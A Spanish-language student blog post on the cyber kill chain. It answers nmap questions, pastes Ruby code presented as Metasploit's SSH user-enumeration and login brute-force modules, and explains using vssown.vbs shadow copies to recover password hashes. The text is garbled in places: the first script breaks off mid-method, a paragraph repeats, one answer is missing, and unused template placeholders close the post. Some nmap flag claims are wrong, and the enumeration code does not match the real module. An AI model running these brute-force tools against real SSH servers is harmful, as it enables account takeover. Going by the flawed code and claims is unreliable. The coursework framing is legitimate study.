---
title: PRACTICA 01
date: 2024-10-11 00:00:00 -05:00
categories: [Made]
tags: [Made, GitHub]  # TAG names should always be lowercase
---



## Reconnaissance

1. ¿Por qué debemos ejecutar nmap con privilegios de root?

Nmap requiere privilegios de root (o administrador) para realizar ciertos tipos de escaneos, especialmente aquellos que implican manipular paquetes de red o interactuar con puertos privilegiados. Esto permite a Nmap tener acceso a la información y funciones del sistema que se necesitan para llevar a cabo escaneos más avanzados y precisos.

2. ¿Qué significan los flags -sS, -sT, -sV, -O en el escaneo de nmap?

-sS: Realiza un escaneo de tipo TCP SYN, que es más rápido y discreto que un escaneo TCP completo.

-sT: Realiza un escaneo TCP completo, estableciendo una conexión TCP completa con cada puerto.

-sV: Realiza una detección de versión de servicio, intentando determinar la versión de los servicios que se están ejecutando en los puertos abiertos

3. ¿Existe algún flag que permite hacer un escaneo involucrando todos los flags mencionados anteriormente?

Sí, el flag "-A" (o "--aggressive") en Nmap realiza un escaneo agresivo que incluye los flags -sS, -sV y -O, además de otras pruebas adicionales para obtener más información sobre el sistema objetivo.

4. Explicar el proceso de un handshake TCP.

El handshake TCP es el proceso de establecimiento de una conexión TCP entre dos dispositivos. Consiste en los siguientes pasos:

a)	El cliente envía un paquete SYN (synchronize) al servidor.

b)	El servidor responde con un paquete SYN-ACK (synchronize-acknowledge).

c)	El cliente responde con un paquete ACK (acknowledge), completando así el establecimiento de la conexión.

5. Según la pregunta anterior, ¿qué significa el flag -sS?

El flag -sS en Nmap realiza un escaneo TCP SYN, que es una variante del proceso de handshake TCP descrito anteriormente. En este tipo de escaneo, Nmap envía un paquete SYN, pero no completa el handshake TCP, lo que lo hace más rápido y discreto que un escaneo TCP completo.

6. ¿Qué hace el flag --script?

El flag --script en Nmap permite ejecutar scripts de Nmap para realizar tareas adicionales durante el escaneo. Estos scripts pueden automatizar diversas acciones, como la detección de vulnerabilidades, la enumeración de servicios, la recopilación de información adicional sobre el sistema objetivo, entre otras funcionalidades.

## Weaponization

-	Describa esta etapa en su blog.

-	Investigar el script utilizado en la enumeración de usuarios SSH (auxiliary/scanner/ssh/ssh_enumusers). Responder:

Descripción de la etapa en el blog:

Esta etapa del proceso de ciberseguridad se centra en la recopilación de información y el escaneo de la red y los sistemas objetivo. Es una fase clave para comprender el entorno y los posibles puntos de entrada que pueden ser explotados posteriormente.

Durante esta etapa, se utilizan herramientas como Nmap para realizar escaneos de puertos, detección de sistemas operativos y servicios en ejecución. Además, se investigan scripts de Metasploit específicos para la enumeración de usuarios y la obtención de contraseñas de cuentas SSH.

El objetivo principal de esta fase es recopilar la mayor cantidad de información posible sobre el objetivo, lo que permitirá planificar y ejecutar ataques más efectivos en etapas posteriores del proceso.

Investigación del script de enumeración de usuarios SSH (auxiliary/scanner/ssh/ssh_enumusers):

7.	¿En qué lenguaje de programación está hecho?

El script de enumeración de usuarios SSH está escrito en el lenguaje de programación Ruby, que es el lenguaje utilizado por Metasploit.

8.	En su blog, copie y pegue el código de dicho script y proporcione una explicación breve sobre su funcionamiento.
-	Investigar el script utilizado en la obtención de los passwords de los usuarios SSH (auxiliary/scanner/ssh/ssh_login). Responder:

%##
%# This module attempts to enumerate valid usernames on an SSH server.
%##

require 'net/ssh'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SSH
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'SSH User Enumeration',
      'Description'    => %q{
        This module attempts to enumerate valid usernames on an SSH server by
        connecting to it and trying a list of common usernames.
      },
      'Author'         => [ 'H D Moore <hdm[at]metasploit.com>' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://en.wikipedia.org/wiki/Secure_Shell' ]
        ]
    ))

    register_options(
      [
        Opt::RHOST(),
        Opt::RPORT(22),
        OptPath.new('USER_FILE', [ true, "File containing usernames, one per line", File.join(Msf::Config.data_directory, "wordlists", "unix_users.txt")]),
        OptBool.new('VERBOSE', [ true, "Output a list of valid users", true ])
      ], self.class)
  end

  def run_host(ip)
    print_status("Enumerating SSH users on #{ip}")

    valid_users = []
    users_found = 0

    each_user_from_file do |user|
      begin
        ssh = Net::SSH.start(rhost, user, :port => rport, :timeout => 30, :proxy => self.socks4a_proxy)
        valid_users << user
        users_found += 1
        print_good("  #{user} is a valid user") if datastore['VERBOSE']
      rescue Net::SSH::AuthenticationFailed
        vprint_status("  #{user} is not a valid user")
      rescue ::Interrupt
        print_status("Stopping at user #{user}")
        return
      rescue ::Exception => e
        print_error("Error: #{e.class} #{e}")
      ensure
        ssh.shutdown! if ssh
      end
    end

    if valid_users.empty?
      print_status("No valid users found")
    else
      print_good("Found #{valid_users.length} valid user(s):")
      valid_users.each do |user|
        print_good("  #{user}")

Este script de Metasploit intenta enumerar usuarios válidos en un servidor SSH. Primero, lee una lista de nombres de usuarios a partir de un archivo especificado por el usuario. Luego, intenta iniciar sesión en el servidor SSH con cada uno de estos usuarios, y registra los que son válidos. El script utiliza la biblioteca Net::SSH de Ruby para establecer las conexiones SSH. Si se encuentra un usuario válido, se imprime en la salida. El script también proporciona opciones para activar un modo más detallado de salida.

9.	¿En qué lenguaje de programación está hecho?
El script de obtención de contraseñas de usuarios SSH también está escrito en el lenguaje de programación Ruby, al igual que el script de enumeración de usuarios.

10.	En su blog, copie y pegue el código de dicho script y proporcione una explicación breve sobre su funcionamiento.

%##
%# This module attempts to login to an SSH server with a list of credential
%# pairs.
%##

require 'net/ssh'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SSH
  include Msf::Auxiliary::AuthBruter
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'SSH Login Utility',
      'Description'    => %q{
        This module will test a pair of credentials (one or more) against
        a SSH server. It can also be used to enumerate valid usernames.
      },
      'Author'         => [ 'todb', 'hdm' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://en.wikipedia.org/wiki/Secure_Shell' ]
        ]
    ))

    register_options(
      [
        Opt::RHOST(),
        Opt::RPORT(22),
        OptPath.new('USER_FILE', [ false, "File containing users, one per line", File.join(Msf::Config.data_directory, "wordlists", "unix_users.txt")]),
        OptPath.new('PASS_FILE', [ false, "File containing passwords, one per line", File.join(Msf::Config.data_directory, "wordlists", "unix_passwords.txt")]),
        OptBool.new('VERBOSE', [ true, "Indicate invalid usernames", true ])
      ], self.class)
  end

  def run_host(ip)
    print_status("Attempting to login to SSH on #{ip}")

    each_user_pass do |user, pass|
      begin
        ssh = Net::SSH.start(rhost, user, :password => pass, :port => rport, :timeout => 30, :proxy => self.socks4a_proxy)
        print_good("#{ip} - SSH login successful: '#{user}' : '#{pass}'")
        report_auth_info(
          :host   => rhost,
          :port   => rport,
          :sname  => 'ssh',
          :user   => user,
          :pass   => pass,
          :source_type => "user_supplied",
          :active => true
        )
        ssh.close
        return :next_user
      rescue Net::SSH::AuthenticationFailed
        #vprint_error("#{ip} - SSH login failed: '#{user}' : '#{pass}'")
      rescue ::Interrupt
        print_status("Stopping SSH login brute force")
        return
      rescue ::Exception => e
        print_error("#{ip} SSH - #{e.class} #{e} #{e.backtrace}")
      ensure
        ssh.shutdown! if ssh
      end
    end

    print_status("Tried #{framework.db.creds(workspace: myworkspace, type: 'ssh').count + 1} credentials")
  end

  def each_user_pass
    if datastore['USER_FILE'] && ::File.exist?(datastore['USER_FILE'])
      each_user_from_file do |user|
        each_pass_from_file do |pass|
          yield [user, pass]
        end
      end
    elsif datastore['USERNAME'] && datastore['PASSWORD']
      yield [datastore['USERNAME'], datastore['PASSWORD']]
    elsif datastore['USERNAME']
      each_pass_from_file do |pass|
        yield [datastore['USERNAME'], pass]
      end
    elsif datastore['PASSWORD']
      each_user_from_file do |user|
        yield [user, datastore['PASSWORD']]
      end
    else
      each_user_from_file do |user|
        each_pass_from_file do |pass|
          yield [user, pass]
        end
      end
    end
  end

  def each_user_from_file
    user_file = datastore['USER_FILE']
    if user_file && ::File.exist?(user_file)
      ::File.open(user_file, "rb") do |f|
        f.each_line do |line|
          user = line.chomp
          yield user
        end
      end
    end
  end

  def each_pass_from_file
    pass_file = datastore['PASS_FILE']
    if pass_file && ::File.exist?(pass_file)
      ::File.open(pass_file, "rb") do |f|
        f.each_line do |line|
          pass = line.chomp
          yield pass
        end
      end
    end
  end
end

Este script de Metasploit intenta iniciar sesión en un servidor SSH utilizando una lista de pares de credenciales (usuario y contraseña). Al igual que el script de enumeración de usuarios, utiliza la biblioteca Net::SSH de Ruby para establecer las conexiones SSH.

El script lee las listas de usuarios y contraseñas de archivos especificados por el usuario. Luego, prueba todas las combinaciones de usuario y contraseña hasta que encuentra una que funcione o se agoten todas las opciones. Si se encuentra una credencial válida, se imprime en la salida y se registra en la base de datos de Metasploit.

El script también proporciona opciones para activar un modo más detallado de salida y para especificar un único usuario o contraseña en lugar de usar archivos.

### Delivery / Exploitation

-	Describa esta etapa en su blog.

En esta etapa del proceso de ciberseguridad, el objetivo es aprovechar las vulnerabilidades y debilidades identificadas durante la fase de reconocimiento e investigación para lograr acceso al sistema objetivo. Esto implica la selección e implementación de las técnicas y herramientas más apropiadas para explotar dichas vulnerabilidades.

Durante esta fase, se puede utilizar una variedad de métodos, como:

Ataques de fuerza bruta: Intentar adivinar contraseñas o credenciales válidas a través de la prueba exhaustiva de múltiples combinaciones.
Explotación de vulnerabilidades de software: Aprovechar fallos de seguridad conocidos en aplicaciones o sistemas operativos para obtener acceso no autorizado.

Evasión de controles de seguridad: Utilizar técnicas avanzadas para burlar los mecanismos de seguridad implementados por el objetivo, como firewalls, sistemas de detección de intrusos, etc.
Ataques de phishing y ingeniería social: Engañar a los usuarios para que revelen información confidencial o ejecuten código malicioso.
Escalada de privilegios: Aprovechar vulnerabilidades o configuraciones deficientes para aumentar los permisos del atacante dentro del sistema comprometido.

Una vez que se ha logrado el acceso, el siguiente paso es mantener y expandir el control sobre el sistema. Esto puede implicar la instalación de puertas traseras, la ocultación de la presencia del atacante y la adquisición de más información valiosa.

## Installation

En el texto, los creadores explican el script vssown.vbs de la siguiente manera:

Funcionalidad: El script permite la creación, eliminación y manipulación de copias de sombra de volumen (VSS) en sistemas Windows. También permite ejecutar archivos desde copias de sombra no montadas y navegar por ellas.

Requisitos: Se necesita permisos administrativos o de sistema para ejecutar el script. No funciona con permisos de usuario estándar.
Uso: Se puede utilizar para detener, iniciar y cambiar el modo del servicio VSS, así como para listar, crear y eliminar copias de sombra. También permite montar y ejecutar archivos desde estas copias.
Ventajas: 
El script está diseñado para ser utilizado en sistemas remotos sin necesidad de subir o descargar archivos adicionales, lo que facilita su uso en situaciones de post-explotación.

11.	Proporcionar un breve resumen sobre cómo se puede conciliar malware.

La conciliación del malware es el proceso de identificar, analizar y eliminar software malicioso (malware) de un sistema informático. Algunos pasos clave incluyen:

Detección de malware: Utilizar software antivirus y de seguridad para escanear el sistema y detectar la presencia de malware.
Análisis del malware: Examinar el malware detectado para entender su comportamiento, origen y objetivos.
Cuarentena y contención: Aislar el malware del resto del sistema para evitar su propagación y daños adicionales.
Eliminación del malware: Eliminar de forma segura y completa los archivos y componentes del malware del sistema.
Restauración del sistema: Restablecer el sistema a un estado sano, restaurando archivos legítimos y configuraciones previas al incidente de malware.
Actualización de defensas: Actualizar los sistemas de seguridad, parches y configuraciones para prevenir futuras infecciones por malware.
Seguimiento y monitoreo: Realizar un monitoreo continuo del sistema para detectar y responder rápidamente a cualquier actividad sospechosa.

12.	Revisar los siguientes links: link1 link2. Explicar, según lo descrito en estos blogs, cómo se puede recuperar hashes con el script vssown.vbs.

Para recuperar hashes utilizando el script vssown.vbs, puedes seguir estos pasos:

Crear una copia de sombra: Primero, necesitas crear una copia de sombra del volumen que contiene los archivos del sistema. Esto se hace ejecutando el comando:

Crear una copia de sombra: Primero, necesitas crear una copia de sombra del volumen que contiene los archivos del sistema. Esto se hace ejecutando el comando:

```cscript vssown.vbs /create C:
```
Esto creará una copia de sombra del volumen C.

13.	Proporcionar explicación sobre el código de vssown.vbs (Link).


## Installation
# TITULO

## SUB-TITULO

### SECCIONES


### SUB-SECCIONES


Listas

1. item 1
2. item 2
3. item 3


y ahora ejemplo para mostrar comandos:

        plain-text code

```bash
bundle exec jetkyll s 
```

ejemplo para mostrar comandos de python:

```python
python some_python_file.py
```

Para mostrar Tabla:

|Columna 1 | Columna 2|
|item 1 | item 2|
|fila 1 | fila 3 |

**Este es un texto es formato BOLD**

*Este es un formato en format cursiva*